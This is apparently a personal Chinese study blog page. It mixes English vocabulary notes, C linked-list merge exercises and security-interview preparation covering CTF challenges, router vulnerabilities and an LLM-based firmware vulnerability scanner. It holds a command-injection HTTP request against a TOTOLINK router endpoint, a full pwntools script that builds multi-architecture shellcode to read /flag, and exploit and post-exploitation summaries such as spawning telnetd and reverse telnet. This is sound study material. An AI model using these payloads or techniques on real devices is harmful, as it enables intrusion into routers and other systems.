---
title: 各种论文和计算机相关的英文单词
date: 2025-03-25 01:32:40 +0800
categories: 
tags: 
permalink: /posts/id=105/
pin: false
published:
---
```
malware 恶意软件
legacy 旧的(遗产)
address解决
capability 能力
revert 复原
pseudo-code 伪代码
Instrumentation 仪器-》检测测量
illustrates 说明显示
nested 嵌套的
intuitive 直观的
syntactical 语法的
strip away 剥离
posing 提出
optimized 优化
million百万 -> 100 m 一亿
corpus 语料
datasets 数据集
proven to 被证明
incorporate 合并
critical 关键的
Experiments 实验
associated with 与什么什么相关
obfuscation 混淆
potential 潜在的可能的
Our findings 我们的研究结果
neither A nor B 都不
both and 
mitigating concerns 缓解担忧
intellectual property 知识产权
infringement 侵权
distributed 分散
inference 推断
benchmark 基准
suite 套件
classifier 分类器
columns 列
implementation 实现
Embedding 嵌入向量表示
Causal 因果的 /自回归
assignment to expression 赋值 给 表达式
```

## 双指针不重复递增归并(两个有序递增链表)
题目：将两个递增的有序链表合并为一个递增的有序链表。要求结果链表仍使用原来两个链表的存储空间, 不另外占用其它的存储空间。表中不允许有重复的数据

2个指针pa/pb从头开始遍历a、b
比较大小，小的纳入c中：
a比b小，插入a，a向前走
a比b大，插入b，b向前走
a与b相等，插入a，a向前走，删除b节点

用尾插法来为c添加新的节点
最后剩下的全加入到c链表里

```c
void mergelist_norep(Linklist a, Linklist b){
    Linklist pa = a->next;
    Linklist pb = b->next;
    Linklist pc = a;
    Linklist q;

    while (pa && pb)
    {
        if (pa->data < pb->data){
            pc->next = pa; // tail insert 3step
            pc = pa;
            pa = pa->next;
        }
        else if (pa->data > pb->data)
        {
            pc->next = pb;
            pc = pb;
            pb = pb->next;
        }
        else if(pa->data == pb->data)
        {
            pc->next = pa;
            pc = pa;
            pa = pa->next;
            q = pb->next;
            free(pb);
            pb = q;
        }
    }
    pc->next = pa?pa:pb; // other one leave something
    free(b);

}

```


## 双指针重复递增归并递减(两个有序递增链表)
题目：将两个非递减的有序链表合并为一个非递增的有序链表。要求结果链表仍使用原来两个链表的存储空间, 不另外占用其它的存储空间。表中允许有重复的数据。


原本是有序递增的，所以多余的部分要注意处理倒序，即pa || pb 
倒序的实现用头插法
双指针去走a和b，谁小谁头插，谁空了对家全头插

```c
void mergelist_reverse(Linklist a, Linklist b){
    Linklist pa = a->next; // 拷贝了 a->next 的指针
    Linklist pb = b->next;
    Linklist pc = a; 
    pc->next = NULL; // 相当于这里把A链表的头节点和首元节点截断了
    Linklist q;
    while (pa || pb)
    {
        if (!pa){//pa zero
            q = pb;
            pb = pb->next;
        }
        else if (!pb)
        {
            q = pa;
            pa = pa->next;
        }
        
        else if (pa->data <= pb->data)
        {
            q = pa;
            pa = pa->next;
        }
        else if (pa->data > pb->data)
        {
            q = pb;
            pb = pb->next;
        }
        q->next = pc->next;// head insert 2step by small size
        pc->next = q;
    }
    
    free(b);

}
```


## 双指针求交集(两个有序递增链表)

已知两个链表A和B分别表示两个集合，其元素递增排列。请设计算法求出A与B的交集，并存放于A链表中。

还是双指针去处理，一起往前走，用尾插法记录交集
如果相等就纳入c中，同时a往前走，删掉b的元素
如果不相等，删除掉小的那个，因为小的那个意味着独有的

知道其中一条链为空，则删除掉另一条


```c
void mix(Linklist a, Linklist b){
    Linklist pa = a->next;
    Linklist pb = b->next;
    Linklist pc = a;
    Linklist u;
    while (pa && pb)
    {
        if (pa->data == pb->data){
            pc->next = pa;
            pc = pa;
            pa = pa->next;
            u = pb->next;
            free(pb);
            pb = u;
        }
        else if (pa->data > pb->data) // both is increase,so dele small one
        {
            u = pb->next;
            free(pb);
            pb = u;
        }
        else if (pa->data < pb->data)
        {
            u = pa->next;
            free(pa);
            pa = u;
        } 
    }
    // if anyone is empty, so dele another one

    while (pa)
    {
        u = pa->next;
        free(pa);
        pa = u;
    }
    while (pb)
    {
        u = pb->next;
        free(pb);
        pb = u;
    }
    pc->next = NULL;
    free(pb);
}
```

## 双指针求差集（两个有序链表）
两个指针 pa/pb 同时从头开始遍历 A 和 B
比较大小：A 小就保留，等于就跳过，B 小就让它追上
A 走完后剩下的直接加入差集


## 面试问答准备
### ctf
+ ==在比赛中遇到印象深刻的题目？==

强网杯的赛题，2022 年的一道totox赛题，需要用三种方式去获取TOTOLINK x5000r的shell，实现页面劫持，固件类型是cgibin负责主要服务的方式，通过websGetVar获取参数，存在未授权的接口，在setopmode功能里

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 90
Origin: http://192.168.3.2
Connection: close
Referer: http://192.168.3.2/advance/time.html?time=1679126798322
Cookie: SESSION_ID=2:1679122532:2


{
	"proto":"1",
	"hostName":"';echo yichen > /tmp/1.txt;' ",
	"topicurl":"setOpModeCfg"
}
```

还有2022年的KOH赛题，MimicCode，一道跨架构shellcode，类似于拟态的效果，远程会调用用不同架构的shellcode执行程序去执行我输入的shellcode，对于异架构才用qemu模拟

```shell
# 环境配置
sudo apt install binutils-arm-linux-gnueabi
sudo apt install binutils-aarch64-linux-gnu
sudo apt install binutils-mips-linux-gnu

# MIPS 小端
sudo apt install binutils-mipsel-linux-gnu

# MIPS64 大端
sudo apt install binutils-mips64-linux-gnuabi64

# MIPS64 小端
sudo apt install binutils-mips64el-linux-gnuabi64
sudo apt install qemu-user qemu-user-static
```

其中主要的难点就是如果在shellcode执行的过程中去识别到不同的架构，来执行对应架构的shellcode
在 x86 下，段寄存器cs=0x23，赋值给ebx，eax-ebx\==0，不跳，执行 x32 shellcode
在 x64 下，段寄存器cs=0x33，赋值给ebx，eax-ebx\==0x10，跳转，执行 x64 shellcode

而arm/arm64/mips/mips64都是定长指令集，每条指令四字节，他们的兼容性主要考虑为某些指令语句的兼容性
像是arm的区分在于，arm架构的b指令对于其他架构兼容性比较强，其他架构识别它常被识别为寄存器的加减，所以可以在shellcode开始时布置，跳转到shellcode尾部布置的arm架构shellcode
而arm64，我们可以不用构造跳转，只要等待前面的跳转指令都未被识别失败就可以跳转到arm64的shellcode
这里qemu-arm对于一些错误的指令尽管无法识别，但是不会崩溃，而是转而执行下一条有效指令
(2c0000ea ea 00002c 	0x2c << 2 = 0xb8 在arm里就是+0xb8，b8就算报错也可以继续执行)
再者就是
mips的区分，需要注意的点是mips为大端序(在写shellcode时顺序不一样)
mips的程序是默认不开启pie的，所以可以利用这一点，是在执行shellcode时会ra寄存器会记录返回地址的值(0x40054C)，这是一个静态地址，可以对它进行比较，如果校验不是那就判断为mips64 

然后就是shellcode构造思路就是打开 /flag 并打印内容，使用2个系统调用open/64位下是openat和sendfile来节省长度
不同架构的系统调用触发指令不一样x86是int 0x80，x64是syscall，arm是svc 0，其中r7寄存器存放系统调用号，arm64是svc0，其中x8做系统调用号，mips和mips64是使用syscall 0x40404，v0做系统调用号

最后构造就是 arm b跳转+mips/mips64 blez相对跳转+x86/x64 jmp跳转 + arm64_shellcode + x86/x64_shellcode + arm_shellcode + mips/mips64_shellcode

后续可以优化的地方主要是，对于x86，可以进一步使用短指令，拆分寄存器，比如把eax拆分成al，retfq 从0x23跳到0x33


```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-hp','64']
def compile_x86(sc):
    r = asm(sc,arch='i386')
    print(r)
    f = open('86.bin','wb').write(r)
    return r

def decompile_x86(sc):
    r = disasm(sc,arch='i386')
    print(r)
    return r

def compile_x64(sc):
    r = asm(sc,arch='amd64')
    print(r)
    return r

def decompile_x64(sc):
    r = disasm(sc,arch='amd64')
    print(r)
    return r

def compile_arm(sc):
    r = asm(sc,arch='arm')
    print(r)
    return r

def compile_thumb(sc):
    r = asm(sc,arch='thumb')
    print(r)
    return r

def compile_arm64(sc):
    r = asm(sc,arch='aarch64')
    print(r)
    return r

def compile_mips(sc):
    r = asm(sc,arch='mips',endian='big')
    print(r)
    return r

x86_x64_jmp = compile_x86('''
mov eax,cs
mov ebx,0x23
sub eax,ebx
jnz x64
x32:
    mov ebx, 0x67
    push ebx
    mov ebx, 0x616c662f
    push ebx
    mov eax, 5
    mov ebx, esp
    xor ecx, ecx
    int 0x80
    mov ebx, 1
    mov ecx, eax
    xor edx, edx
    mov esi, 1000
    mov eax, 0xbb
    int 0x80
x64:                                     
''')# open sendfile(1, fd, NULL, 1000); eax=0xbb

x64_sc = compile_x64('''
    mov rbx, 0x67616c662f
    push rbx
    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 1000
    mov rax, 40
    syscall
''')# open sendfile(1, fd, NULL, 1000);40

arm_sc = compile_arm('''
    adr  r0, flag
    eor  r1, r1
    eor  r2, r2
    mov  r7, #5
    svc  0
    mov  r1, r0
    mov  r0, #1
    eor  r2, r2
    mov  r3, #100
    mov  r7, #0xbb
    svc  0
flag:
	.ascii "/flag"              
''')# r7 svc  r0/r1/r2

arm64_sc = compile_arm64('''
    adr  x1, flag
    mov  x2, #0
    mov  x0, x2
    mov  x8, #56
    svc 0
    /* call sendfile(1, 'x0', 0, 0x7fffffff) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, #0
    mov  x3, 100
    mov  x8, #SYS_sendfile
    svc 0
flag:
	.asciz "/flag" 
''')

mips_sc = compile_mips('''
    li  $t1, 0x2f666c61
    sw  $t1, ($sp)
    lui $t9, 0x6700
    sw $t9, 4($sp)
    
    li $t1,0xfa5
    li $t2,0x106f
    
    li $t6,0x40054c
    beq $ra,$t6,main
    nop
    li $t1,0x138a
    li $t2,0x13af
    
    main:
    move $a0,$sp
    li $a1,0
    li $a2,0
    move $v0, $t1
    syscall 0x40404

    li $a0, 1
    move $a1, $v0
    li $a3, 100
    move $v0, $t2
    syscall 0x40404
''')

#io = process("./ShellcodeRunnerX86")
#gdb.attach(io,"b * 0x080497B3")

# io = process("./ShellcodeRunnerX64")
# gdb.attach(io,"b * 0x401717")

# io = process(["/bin/sh",'-c','qemu-arm ./ShellcodeRunnerARM32'])
# io = process(["/bin/sh",'-c','qemu-arm -g 1234 ./ShellcodeRunnerARM32'])
# gdb.attach(io,"b * 0x10614")

#io = process(["/bin/sh",'-c','qemu-aarch64 ./ShellcodeRunnerARM64'])
# io = process(["/bin/sh",'-c','qemu-aarch64 -g 1234 ./ShellcodeRunnerARM64'])
#b * 0x400768

#io = process(["/bin/sh",'-c','qemu-mips ./ShellcodeRunnerMIPS'])
io = process(["/bin/sh",'-c','qemu-mips -g 1234 ./ShellcodeRunnerMIPS'])
#b * 0x400544

# io = process(["/bin/sh",'-c','qemu-mips64 ./ShellcodeRunnerMIPS64'])
#io = process(["/bin/sh",'-c','qemu-mips64 -g 1234 ./ShellcodeRunnerMIPS64'])
#b * 120004088

thumb_jmp = compile_arm('''
    add    r2, pc, #1
    bx     r2                        
''')

arm_jmp   = bytes.fromhex('2c0000ea') # b 0x2c arm64
jmp_0x36_x86_x64 = bytes.fromhex('eb34001c') # jmp 0x36

#    2273ff9c        addi    s3, s3, -100
#    1a600050        blez    s3, 0x144
#    2273ff9c        addi    s3, s3, -100 !!! nop
#    2273ff9c        addi    s3, s3, -100 !!! nop

mips_jmp = bytes.fromhex('2273ff9c1a6000512273ff9c2273ff9c')
#mips_jmp = bytes.fromhex('1ae0003b')


test = arm_jmp + mips_jmp + jmp_0x36_x86_x64 + arm64_sc + x86_x64_jmp + x64_sc
test = test.ljust(0xbc,b'a') # len: 0xbc
test += arm_sc               # len: 0xf0  arm_sc : 52
test += mips_sc              # len: 0x134 mips_sc: 68

#print(disasm(mips_sc,arch='mips',endian='big'))

#test = test.ljust(0x150,b'a')
test += bytes.fromhex('18000000') # bug

#  0:   1800ffea        blez    zero, 0xffffffac
#  mips jump back
test += bytes.fromhex('1800ffe7')

print(len(test))
print((test).hex())
print(pow(0x1000/len(test),6))



io.recvuntil(b"Shellcode >")
io.send(test)
io.interactive()
```

还有2023年强网杯

teeworlds 是一个射击和夺旗的开源C语言游戏，基本的逻辑上就是写一个hook函数，去实现自动瞄准
主要的思路是先去找角色的移动，因为按键输入方向以后，游戏要识别对应的方向，可以写一个hook函数，print出每次输入的结果，这里面还包括了点击子弹的操作
找到它开枪方向的处理函数，通过游戏本身的接口函数获取敌人的坐标，然后传入开枪方向的函数里就能实现简单的自动瞄准了



+ ==关于arm/mips等指令集？==

mips是大端序，定长指令，❗不管跳不跳，beq 之后那一条指令（延迟槽）总会执行！

lw 载入 从右往左存储
sw 存储 从左往右存储
lui 载入高位立即数 一般是0x1235 即16位2字节，低2字节自动补0
ori 载入低16位
li 载入立即数
la 载入字符串
move
sll 逻辑左移
srl 逻辑右移
beq b eq 相等跳转 
bne b not eq 不相等跳转
blez b little eq zero 如果左边小于0就跳转
slt small lt 小于置位 slt $t0 $t1 $t2 就是判断t1和t2 
slti small lt i

j
jr 
jal 跳转并连接 jal func 跳转到func，返回地址存放到$ra
jalr 跳转寄存器
参数传递时 a0-a3 多的用栈传递 $ra存放返回的地址通常和jal联动，返回值用v0-v1存放，系统调用号也用v0
主要寄存器是a  s t 
 
---------------------------------------------------------------------------------------------------
拓展arm汇编：
定长 32 位

参数传递同样是r0-r3，其余用stack传递，然绘制通常是r0-r1
lr link register 保存返回地址 类似$ra
系统调用号是r7
arch64就是r变成x

ldr 加载指令 
str 存储指令
adr 加载相对指令 
movw 加载低16位
movt 加载高16位

b 相对偏移跳转
bl 返回地址存放到lr
bx 返回到lr
beq 关键在于它是判断zf寄存器的，如果为1则跳转
bne
bgt 大于跳转
blt 小于跳转
bal aways跳转
blx <\reg>跳转并切换状态
如果 <\reg> 的值是奇数 → 切换到 Thumb 模式
如果是偶数 → 保持或切换回 ARM 模式

Thumb 模式是“轻量 ARM”
特性	ARM 模式（A32）	Thumb 模式（T32 / Thumb-1）
指令宽度	全是 32 位指令	多为 16 位（Thumb-1）/ 16+32 位（Thumb-2）
性能	指令丰富，速度更快	指令精简，占内存更少
二进制大小	大	小（适合嵌入式）
可执行平台	通常用在性能更高平台	常用于 MCU、嵌入式、手机平台
切换方式	bx 或 blx 指令切换	与 ARM 模式互相切换


+ ==补天杯破解大赛这个可以详细说说吗？==

TL-WPA7510 AC套件
admin接口设置语言的时候存在命令注入，缺少鉴权


+ ==windows/linux基本保护机制（栈执行保护，基址随机化，代码段随机化，栈溢出保护）怎么绕过？==
NX/DEP:ROP
ASLR: 泄露地址(got/libc)，PIE泄露基地址，爆破攻击



+ ==给你一个栈溢出，开了PIE的情况下，你怎么获取shell==
泄露程序基地址或者爆破


+ ==比赛里担任怎样的角色，印象深刻的一场比赛，遇到的赛题，输出占比==
主要是处理pwn方向的题目，(题目就说强网杯)，输出占比1/4

+ ==最近比赛里比较印象深刻的题目==
Hexagon 架构的题目，32位，用qemu去启动，类似于ARM架构用R寄存器，就是一个4字节溢出，可以用qemu的调试日志功能进行日志调试，构造栈迁移即可获取shell

+ ==条件竞争漏洞==
比如现在有一个程序，功能是检查一个文件是否存在，如果不存在就创建写入内容，而另一个也在同时执行，就会造成覆写
### iot

+ ==谈一谈怎么挖掘未授权的路由器漏洞==
1.收集路由器的接口，尝试访问，看是否存在后台页面可未授权访问
2.查看路由器的配置文件和一些相关产品的历史漏洞，看是否存在直接暴露密码的逻辑
3.检查密码check的逻辑，看是否存在绕过的可能


+ ==路由器系统启动，或者linux系统启动流程是怎样的？==
首先是硬件上电执行boot ROM固件，主要负责加载引导程序，其任务包含初始化网卡、内存等外设，加载并解压内核镜像，设置启动参数，最终跳转执行到内核入口。
接下来内核开始运行，完成硬件驱动初始化和文件系统挂载后就会执行第一个进程init，会进一步调用/etc/init.d/rcS文件完成模块加载和服务启动


+ ==漏洞后利用的方式？==
1. 获取持续的shell，构造telnet反弹，或者修改类似于rcS实现重启后继续控制
2. DNS劫持，修改为创建自建的DNS服务器，中间人攻击，用工具监听DNS请求
3. 获取敏感信息，比如固件，配置文件，密码等
4. 设置反向代理，进入内网


+ ==复现过比较牛逼的洞(印象深刻的洞)==

飞塔CVE-2022-42475，飞塔防火墙的特点是多个功能都放在一个二进制文件中，其中包括了sslvpn功能(认证服务器，外部用户端设备通过sslvpn服务器进入内网)，这个漏洞点在于在sslvpn在接受报文后，会根据content-lenth分配内存，并从socket中读入数据将其通过memcpy拷入堆空间中。这里在取content-lenth作为malloc_size的时候是取4字节，再通过movsxd扩展为8字节，如果一开始输入一个大于4字节的size，就会导致申请到一个很小的堆，而memcpy是根据输入的size进行cpy内容的，就会造成堆溢出。

后续利用通过堆叠，溢出覆盖SSL结构体中的函数指针，给其他socket发送数据触发handshake函数，利用栈迁移的gadget控制到可控数据区执行ROP，mprotect改权限jmp rsp执行shellcode




%% 小米的那个洞
CVE-2023-26315
AX9000的固件是AArch64el架构的

arch架构qemu环境获取
从qcow2 镜像中提取出来 Linux 内核和 initrd
运行 %%


+ ==能讲讲你挖到的比较有难度的洞吗，难点在哪==
CVE-2023-50993，ws6008是锐捷的AC产品，它的文件系统是基于lua语言的luci框架开发的，根据这个框架可以去找它的功能函数接口，在file.lua包含了一个文件下载功能，功能通过post获取参数，有调用函数对传入的目录参数进行校验和目录穿越检测，然后会执行shell指令同时将读入的文件名拼接进shell指令中，但是缺少对文件名的检测，所以可以通过；拼接导致命令执行，开启telnetd

难点在于luci框架比较庞大，基本都调用框架内的参数检测函数进行了参数校验，所以需要仔细理解并分析各个功能的执行流程


+ ==描述一下IOT二进制LLM漏洞筛查工具==
参考LLM节

+ ==固件解密一般怎么实现==
找临界版本

+ ==车联网了解多少==
在车联网比赛中，我主要接触了 OBU 和 RSU 设备。由于车联网依赖于无线通信协议（如 Wi-Fi、LTE 或 5G），我们进行渗透测试时，通常会关注这些设备之间的无线通信，主要尝试能否弱密码等，我也检查了设备的接口，测试是否存在身份验证漏洞或弱密码。以及车机的一些云平台，存在目录穿越等web漏洞

### 编程语言
Python, C, x86/arm/mips汇编, Shell, Golang


C/C++结构体大小如何计算？
C++的结构体和C的区别？
new和malloc的区别（delete和free的区别）
构造函数与析构函数调用时机
重载如何实现（静态函数名重载，动态虚函数重写）
虚函数如何实现？（重点，几乎必问，虚表指针位置）
32位下调用约定有哪些？（stdcall c标准调用 fastcall thiscall）
64位下调用约定？（VC：rdx rcx r8 r9，GCC: 多rdi rsi）

arm汇编和mips汇编x86汇编


### 逆向工程

32位程序如何在64位机器上运行？
PE格式（重点，几乎必问
PE装载进内存执行的过程（重点，内存对齐，IAT表建立，重定位）
知道哪些反调试手段？（SEH，反断点，查调试环境）
+ ==GDB的实现原理==
主要是通过ptrace实现(信号处理机制)，通过ptrace启动一个程序并让它暂停
+ ==硬断点和软断点的区别==
硬断点由硬件支持的，依赖于 CPU 的硬件调试功能，用ptrace机制将断电地址加载到CPU调试寄存器中，执行到时产生硬件中断
软断点插入特殊指令比如int 3，需要修改程序
日志断点，不暂停程序执行，只记录日志


gdb/od基本命令
如何脱壳（压缩壳/加密壳/虚拟化壳）
为什么脱完壳要修复导入表？
花指令有没有脱过？
有没有写过IDA脚本
如果一个程序没有字符串/字符串被混淆了如何找核心代码？
Hook有哪些方法？（几乎必问，inline hook，函数表hook）
ARM汇编了解过吗（没有...）
windows下有哪些注入方式？怎么实现？（重点）

### LLM
+ ==有研究过LLM在安全漏洞检测方向的应用，探索用RAG方法提高漏洞分析的准确性，有采用LoRA和QLoRA进行高效微调、优化大模型的漏洞理解能力的经验==

GPT类模型，核心是预测下一个词，擅长生成类任务
BERT类模型(双向编码器)，核心是理解上下文预测词，擅长问答和识别

做一个项目，主要针对二进制固件，结合大模型进行已知的漏洞筛查的一个工具设计



最初我开始写的时候是考虑用微调的方式来实现，期望让模型学会漏洞代码的规律，实现自动的漏洞检测
具体的效果是通过对大模型微调实现，实现识别唯一代码
主要使用的是mistralai-7B的模型，对模型做8bit量化，再用loRA方式进行微调(主流的方式有adapter微调(插入adapter模块，适用于多任务学习)和LoRA微调(引入低秩矩阵))
8bit量化原本是32bit浮点数，转化为8bit整数0.25 ≈ 64，减少显卡内存占用

LoRA简单来说就是，原本需要训练一个3\*3的矩阵，现在只用训练3\*1 和1\*3，共6个数
主要逻辑就是定义2个新矩阵A和B，随机高斯分布初始化A，0矩阵初始化B，使得AXB=0。这样W原+WAB = W原

我是猪，首先会对这3个词进行向量化，然后用Wqkv矩阵对向量进行处理，每个词都会有自己的Q、K、V向量。然后会计算词与词之间的Q向量和K向量的相似度，如果相似度高，就更关注它的值向量。然后根据每个词的加权值向量为每个词生成一个新的向量表示(包含了词与词之间的关系)

实现上主要用的peft这个库，lora的参数主要包含了低秩矩阵的秩、缩放因子(通常是秩的2倍)、以及需要微调的模块(没有k，原因是k是相似度的固定参考)等
整个过程就是qLoRA

其中比较关键的点，一是lora的参数和train的参数(轮数和批数，还有学习率)，二就是数据集的处理，应该要减少大模型需要发挥的范围，比如尽量让其只完成填补的工作，比如input是一个挖空的语句，而output是把空填上的语句，这样能减少训练的复杂度并加速收敛

```python
import torch
from datasets import load_dataset
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    TrainingArguments,
    Trainer,
    DataCollatorForSeq2Seq
)
import os
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
os.environ["TOKENIZERS_PARALLELISM"] = "false"

# 加载数据集
dataset = load_dataset("json", data_files="new_decompile_ghidra_25k.jsonl")['train']

# 设置模型
tokenizer = AutoTokenizer.from_pretrained("mistralai/Mistral-7B-Instruct-v0.3", padding_side="left", trust_remote_code=True)
tokenizer.pad_token = tokenizer.eos_token

# 数据Tokenize处理
def tokenize(batch):
    max_length = 4096
    prompt = "What is the unique number corresponding to this code?"
    inputs = tokenizer([prompt + inst for inst in batch["instruction"]], padding="max_length", truncation=True, max_length=max_length)
    labels = tokenizer([str(o) for o in batch["output"]], padding="max_length", truncation=True, max_length=max_length).input_ids
    labels = [[-100 if token == tokenizer.pad_token_id else token for token in label] for label in labels]
    
    inputs["labels"] = labels
    return inputs

tokenized_data = dataset.map(tokenize, batched=True)  # 批次处理

# 加载8-bit量化模型
model = AutoModelForCausalLM.from_pretrained(
    "mistralai/Mistral-7B-Instruct-v0.3",
    load_in_8bit=True,  # 启用 8-bit 量化
    device_map="auto",
    trust_remote_code=True
)

# 适配 8-bit 训练
model = prepare_model_for_kbit_training(model)
model.config.use_cache = False  # **确保 use_cache 关闭，避免冲突**

# LoRA 配置
lora_config = LoraConfig(
    r=16,
    lora_alpha=32,
    target_modules=["q_proj", "v_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM"
)

# 应用 LoRA 适配
model = get_peft_model(model, lora_config)
for name, param in model.named_parameters():
    if param.requires_grad:
        print(f"✅ 可训练参数: {name}, 形状: {param.shape}")

# 训练参数配置
training_args = TrainingArguments(
    output_dir="finetune-mistral-ghidra",
    per_device_train_batch_size=1,
    num_train_epochs=2,
    save_strategy="epoch",
    learning_rate=2e-5,
    warmup_ratio=0.05,
    logging_steps=100,
    gradient_checkpointing=False,  # 关闭梯度检查点，避免显存占用过高
    gradient_accumulation_steps=8,
    dataloader_num_workers=2,
    optim="paged_adamw_8bit",  # 适用于8-bit 量化训练
    lr_scheduler_type="cosine",
)

# 数据整理器
data_collator = DataCollatorForSeq2Seq(tokenizer, model=model, padding=True)

# 初始化Trainer
trainer = Trainer(
    model=model,
    train_dataset=tokenized_data,
    args=training_args,
    data_collator=data_collator,
)

# 开始训练
train_result = trainer.train()

# # 输出Loss变化
# print("训练Loss变化:")
# for log in train_result.training_loss_history:
#     print(f"Step {log['step']}: Loss = {log['loss']}")

# 保存微调后的模型和Tokenizer
trainer.save_model("./finetune-mistral-ghidra")
tokenizer.save_pretrained("./finetune-mistral-ghidra")

# 合并 LoRA 适配器到基础模型并保存
print("合并 LoRA 适配器到原始模型中...")
model = model.merge_and_unload()
model.save_pretrained("./finetune-mistral-ghidra/merged")
tokenizer.save_pretrained("./finetune-mistral-ghidra/merged")

print("训练和保存完成，微调后的模型及合并后的模型已存储在 ./finetune-mistral-ghidra 目录下！")
```


后来主要现实思路是以RAG的形式来实现的
对已有漏洞代码进行向量化，再使用 FAISS来建立向量索引，再加载多个模型包括用于向量化漏洞代码的模型和语义匹配的模型。在匹配上主要通过
BM25基于词频率和文档长度的概率模型评估得分
FAISS相似度计算，通过 FAISS 库对查询代码进行向量化，进行快速的相似度检索，找到最相似的代码片段
CodeBERT语义匹配
长度比、查询代码和库代码的长度比

综合这4点进行综合评估选择相似度最高的结果输出

```python
import argparse
import re
import tempfile
from pathlib import Path
import time
from datasets import load_dataset
from transformers import AutoModelForCausalLM, AutoTokenizer, TrainingArguments, Trainer ,BitsAndBytesConfig, AutoModel
from peft import LoraConfig, get_peft_model
from transformers import DataCollatorForSeq2Seq
from rich.console import Console
from rich.live import Live
from rich.progress import track
from rich.table import Table
from GhidraBridge.ghidra_bridge import GhidraBridge
import json
import faiss
import numpy as np
import torch
from sentence_transformers import SentenceTransformer
from sklearn.metrics.pairwise import cosine_similarity
from rank_bm25 import BM25Okapi

class Zhuzhao:
    def _load_faiss_index(self, index_path, metadata_path):
        index = faiss.read_index(index_path)
        with open(metadata_path, "r", encoding="utf-8") as f:
            metadata = {str(entry["vector_id"]): entry for entry in map(json.loads, f)}
        return index, metadata 
       
    def _load_model(self):
        encoder = SentenceTransformer("deepseek-ai/deepseek-coder-6.7b-instruct")  # 向量化
        codebert_tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")  # 语义匹配
        codebert_model = AutoModel.from_pretrained("microsoft/codebert-base").to("cuda")
        mistral_model_name = "mistralai/Mistral-7B-Instruct-v0.3"
        mistral_tokenizer = AutoTokenizer.from_pretrained(mistral_model_name)
        mistral_model = AutoModelForCausalLM.from_pretrained(
            mistral_model_name,
            device_map="auto",
            torch_dtype=torch.float16
        )
        return encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model

    def _compute_length_ratio(self, query_code, candidate_code):
        query_len = len(query_code)
        candidate_len = len(candidate_code)
        length_ratio = min(query_len, candidate_len) / max(query_len, candidate_len)
        return length_ratio
    

    def _bm25_filter(self, query_code, metadata, top_k=10):
        corpus = [entry["input"] for entry in metadata.values() if entry.get("input")]
        bm25 = BM25Okapi([doc.split() for doc in corpus])
        scores = bm25.get_scores(query_code.split())
        top_indices = np.argsort(scores)[::-1][:top_k]
        return [list(metadata.values())[i] for i in top_indices if scores[i] > 0]

    def _search_vulnerability(self, query_code, index, metadata, encoder, codebert_tokenizer, codebert_model, top_k=3):
        query_vector = encoder.encode(query_code).astype(np.float32).reshape(1, -1)
        distances, indices = index.search(query_vector, k=top_k)

        candidates = []
        for idx in indices[0]:
            if str(idx) in metadata:
                candidate = metadata[str(idx)]
                candidates.append(candidate)

        best_match = None
        best_score = 0

        for candidate in candidates:
            candidate_text = candidate["input"]
            length_ratio = self._compute_length_ratio(query_code, candidate_text)

            inputs = codebert_tokenizer([query_code, candidate_text], return_tensors="pt", padding=True, truncation=True).to("cuda")
            with torch.no_grad():
                embeddings = codebert_model(**inputs).last_hidden_state.mean(dim=1).cpu().numpy()

            score = cosine_similarity([embeddings[0]], [embeddings[1]])[0][0]

            print(f"[!] FAISS={distances[0][0]:.4f}, CodeBERT={score:.4f}, len_radio={length_ratio:.4f}")

            # 匹配项满足：
            # 1. FAISS 相似度 > 0.85
            # 2. CodeBERT 语义匹配 > 0.75
            # 3. 长度比 > 0.7 
            if score > best_score and distances[0][0] < 0.85 and score > 0.75 and length_ratio > 0.7:
                best_match = candidate
                best_score = score

        if best_match:
            print(f"[+] 选择最佳匹配: 相似度 {best_score:.4f}")
            return best_match
        else:
            print("[-] 没有匹配")
            return None


    def _format_vulnerability_output(self, vuln_entry):
        output_lines = vuln_entry["output"].split("\n")
        vuln_id = output_lines[0].replace("内部漏洞编号: ", "").strip() if len(output_lines) > 0 else "未知"
        vuln_type = output_lines[1].replace("漏洞类型: ", "").strip() if len(output_lines) > 1 else "未知"
        vuln_cause = output_lines[2].replace("漏洞原因: ", "").strip() if len(output_lines) > 2 else "未知"
        vuln_risk = output_lines[3].replace("风险等级: ", "").strip() if len(output_lines) > 3 else "未知"
        vuln_fix = output_lines[4].replace("修复建议: ", "").strip() if len(output_lines) > 4 else "未知"

        return f"""内部漏洞编号: {vuln_id}
    漏洞类型: {vuln_type}
    漏洞原因: {vuln_cause}
    风险等级: {vuln_risk}
    修复建议: {vuln_fix}"""


    def _analyze_with_mistral(self, query_code, tokenizer, model):
        tokenizer.pad_token = tokenizer.eos_token
        user_message = f"""请分析以下代码，找出潜在漏洞并提供修复建议，保持以下格式（请填充完整）：
    内部漏洞编号: 未知
    漏洞类型: 
    漏洞原因: 
    风险等级: 
    修复建议: 

    代码如下：
    {query_code}"""

        input_text = tokenizer.apply_chat_template(
            [{"role": "system", "content": "你是一名漏洞分析专家，请分析以下代码是否存在漏洞，并输出严格符合格式的结果。"},
            {"role": "user", "content": user_message}],
            tokenize=False
        )

        model_inputs = tokenizer(input_text, return_tensors="pt", padding=True, truncation=True, max_length=2048).to("cuda")

        with torch.no_grad():
            outputs = model.generate(**model_inputs, max_new_tokens=1024)

        return tokenizer.decode(outputs[0], skip_special_tokens=True)







    def _get_code_from_decom_file(self, path_to_file):
        with open(path_to_file, "r") as file:
            return file.read()
        
    def _decompile_binary(self, decom_folder, binary):
        g_bridge = GhidraBridge()
        g_bridge.decompile_binaries_functions(binary, decom_folder)
        
        list_of_decom_files = []

        for file_path in Path(decom_folder).iterdir():
            binary_name, function_name, *_ = Path(file_path).name.split("__")
